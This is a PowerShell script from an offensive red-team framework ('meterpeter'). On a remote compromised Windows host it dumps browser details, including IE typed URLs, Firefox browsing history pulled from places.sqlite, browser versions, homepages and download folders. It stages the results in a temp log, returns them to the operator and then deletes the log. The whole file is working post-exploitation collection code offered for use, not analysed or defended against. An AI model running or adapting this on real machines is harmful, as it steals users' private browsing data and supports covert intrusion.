<#
.SYNOPSIS
  Standalone Powershell script that will dump remote-host browser information.

.Author r00t-3xp10it (SSA RedTeam @2020)
  Required Dependencies: Remote Web Browser
  Optional Dependencies: None

.DESCRIPTION
   Standalone Powershell script to dump remote-host browser information sutch as: HomePage, Browser Version
   Language Used, Browser Download Directory, etc.. The dumps will be created in remote-host $env:tmp folder.

.EXECUTION
   ./GetBrowser.ps1
 
.LINK 
    https://github.com/r00t-3xp10it/meterpeter
    https://github.com/rvrsh3ll/Misc-Powershell-Scripts/blob/master/Get-BrowserData.ps1
#>


$RFP = $null
$Path = $null
$JsPrefs = $null
$RegPrefs = $null
$ParsingData = $null


## Retrieve IE Browser Information
$IEVersion = Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Internet Explorer" -Name 'Version' -ErrorAction SilentlyContinue|Select-Object 'Version'
If(-not($IEVersion) -or $IEVersion -eq $null){
    echo "`n`n   IE Browser" > $env:tmp\BrowserEnum.log
    echo "   ----------" >> $env:tmp\BrowserEnum.log
    echo "   Could not find any IE Browser Info .." >> $env:tmp\BrowserEnum.log
}else{
    $IEData = $IEVersion -replace '@{Version=','Version   : ' -replace '}',''
    $KBNumber = Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Internet Explorer" -Name 'svcKBNumber'|Select-Object 'svcKBNumber'
    $KBData = $KBNumber -replace '@{svcKBNumber=','KBUpdate  : ' -replace '}',''
    $RegPrefs = Get-ItemProperty -Path "HKCU:\Software\Microsoft\Internet Explorer\Main\" -Name 'start page'|Select-Object 'Start Page'
    $ParsingData = $RegPrefs -replace '@{Start Page=','HomePage  : ' -replace '}',''
    ## Build Remote LogFile
    echo "`n`n   IE Browser" > $env:tmp\BrowserEnum.log
    echo "   ----------" >> $env:tmp\BrowserEnum.log
    echo "   $KBData" >> $env:tmp\BrowserEnum.log
    echo "   $IEData" >> $env:tmp\BrowserEnum.log
    echo "   $ParsingData" >> $env:tmp\BrowserEnum.log
}

## Retrieve IE history URLs
$IEHistory = Get-ItemProperty -Path "HKCU:\SOFTWARE\Microsoft\Internet Explorer\TypedURLs" -ErrorAction SilentlyContinue|findstr /B /I "url"
If(-not($IEHistory) -or $IEHistory -eq $null){
    echo "`n   IE Browser History" >> $env:tmp\BrowserEnum.log
    echo "   ------------------" >> $env:tmp\BrowserEnum.log
    echo "   Could not find any IE History Info .." >> $env:tmp\BrowserEnum.log
}else{
    $parseIEHistory = $IEHistory -replace '         :','      :'
    echo "`n   IE Browser History" >> $env:tmp\BrowserEnum.log
    echo "   ------------------" >> $env:tmp\BrowserEnum.log
    echo "   $parseIEHistory" >> $env:tmp\BrowserEnum.log
}


## Retrieve FireFox Browser Information
$Path = Test-Path "$env:APPDATA\Mozilla\Firefox\Profiles";
If($Path -eq $True){
    ## change to the correct directory structure
    cd $env:APPDATA\Mozilla\Firefox\Profiles;cd *.default

    ## get PlatformVersion
    $JsPrefs = Get-content prefs.js|Select-String "extensions.lastPlatformVersion"
    $ParsingData = $JsPrefs[0] -replace 'user_pref\(','' -replace '\"','' -replace ',',':' -replace '\);','' -replace 'extensions.lastPlatformVersion','Version   '
    echo "`n`n   FireFox Browser" >> $env:tmp\BrowserEnum.log
    echo "   ---------------" >> $env:tmp\BrowserEnum.log
    echo "   $ParsingData" >> $env:tmp\BrowserEnum.log

    ## get brownser startup page
    $JsPrefs = Get-content prefs.js|Select-String "browser.startup.homepage"
    $ParsingData = $JsPrefs[0] -replace 'user_pref\(','' -replace '\"','' -replace ',',':' -replace '\);','' -replace 'browser.startup.homepage','HomePage  '
    echo "   $ParsingData" >> $env:tmp\BrowserEnum.log

    ## get browser DownloadDir
    $JsPrefs = Get-content prefs.js|Select-String "browser.download.lastDir";
    $ParsingData = $JsPrefs[0] -replace 'user_pref\(','' -replace '\"','' -replace ',',':' -replace '\);','' -replace 'browser.download.lastDir','Downloads '
    echo "   $ParsingData" >> $env:tmp\BrowserEnum.log
}else{
    echo "`n`n   FireFox Browser" >> $env:tmp\BrowserEnum.log
    echo "   ---------------" >> $env:tmp\BrowserEnum.log
    echo "   Could not find any FireFox Info .." >> $env:tmp\BrowserEnum.log
}

## Dump FIREFOX HISTORY URLs
If($Path -eq $False) {
    echo "`n   FireFox History" >> $env:tmp\BrowserEnum.log
    echo "   ---------------" >> $env:tmp\BrowserEnum.log
    echo "   Could not find any FireFox History URLs .." >> $env:tmp\BrowserEnum.log
}else{
    $Profiles = Get-ChildItem "$env:AppData\Mozilla\Firefox\Profiles\*.default\"
    $Regex = '([a-zA-Z]{3,})://([\w-]+\.)+[\w-]+(/[\w- ./?%&=]*)*?'
    echo "`n   FireFox History" >> $env:tmp\BrowserEnum.log
    echo "   ---------------" >> $env:tmp\BrowserEnum.log
    Get-Content $Profiles\places.sqlite | Select-String -Pattern $Regex -AllMatches | % { $_.Matches } | % { $_.Value } | Sort-Object -Unique | % {
        $Value = New-Object -TypeName PSObject -Property @{
            FireFoxHistoryURL = $_
        }
        if ($Value -match $Search) {
            $ParsingData = $Value -replace '@{FireFoxHistoryURL=','' -replace '}',''
            echo "   $ParsingData" >> $env:tmp\BrowserEnum.log
        } 
    }
}


## Get Google Chrome Version
$Path = Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Window\CurrentVersion\App Paths\chrome.exe' -ErrorAction SilentlyContinue
If(-not($Path) -or $Path -eq $null){
    echo "`n`n   Chrome Browser" >> $env:tmp\BrowserEnum.log
    echo "   --------------" >> $env:tmp\BrowserEnum.log
    echo "   Could not find any Chrome Info .." >> $env:tmp\BrowserEnum.log
}else{
    $GCVersionInfo = (Get-Item (Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Window\CurrentVersion\App Paths\chrome.exe').'(Default)').VersionInfo
    $GCVersion = $GCVersionInfo.ProductVersion
    echo "`n`n   Chrome Browser" >> $env:tmp\BrowserEnum.log
    echo "   --------------" >> $env:tmp\BrowserEnum.log
    echo "   Version   : $GCVersion" >> $env:tmp\BrowserEnum.log
}


### ----


## Retrieve Remote Info from LogFile
Get-Content $env:tmp\BrowserEnum.log;Remove-Item $env:tmp\BrowserEnum.log -Force